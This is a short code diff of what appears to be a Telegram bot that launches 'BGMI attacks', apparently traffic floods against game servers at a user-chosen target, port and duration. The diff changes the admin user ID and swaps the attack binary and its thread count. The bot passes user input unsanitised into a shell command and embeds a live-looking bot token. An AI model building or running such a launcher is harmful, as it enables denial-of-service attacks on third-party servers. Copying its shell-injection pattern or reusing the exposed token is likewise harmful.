@@ -11,7 +11,7 @@ keep_alive()
 bot = telebot.TeleBot('8182540858:AAEltUzam58BCdvXdMh6iTvEHaPk28FiwJs')
 
 # Admin user IDs
-admin_id = ["1942360454"]
+admin_id = ["7474328522"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -313,7 +313,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/kv', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./kv {target} {port} {time} 750"
+                full_command = f"./bgmi1 {target} {port} {time} 900"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
